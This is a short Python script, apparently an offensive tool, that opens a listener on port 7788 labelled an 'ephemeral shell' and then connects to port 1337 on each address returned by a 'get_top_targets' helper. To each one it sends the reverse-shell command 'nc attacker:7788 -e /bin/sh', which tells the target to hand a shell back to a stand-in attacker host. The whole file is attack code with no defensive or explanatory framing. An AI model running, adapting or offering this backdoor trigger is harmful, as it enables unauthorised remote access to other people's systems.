import socket, threading, time
from memory_engine import get_top_targets

def ephemeral_listener():
    s = socket.socket()
    s.bind(("0.0.0.0", 7788))
    s.listen(1)
    print("[*] Ephemeral shell listening on :7788 for 15s")
    s.settimeout(15)
    try:
        conn, addr = s.accept()
        conn.sendall(b"whoami\n")
        print(f"[+] Connection from {addr}")
        conn.close()
    except:
        pass
    s.close()

def deploy_backdoor():
    threading.Thread(target=ephemeral_listener).start()
    time.sleep(2)
    for t in get_top_targets():
        ip, _ = t.split(":")
        try:
            s = socket.socket()
            s.connect((ip, 1337))
            s.sendall(b"nc attacker:7788 -e /bin/sh\n")
            s.close()
            print(f"[+] Backdoor trigger sent to {ip}")
        except:
            pass

if __name__ == "__main__":
    deploy_backdoor()
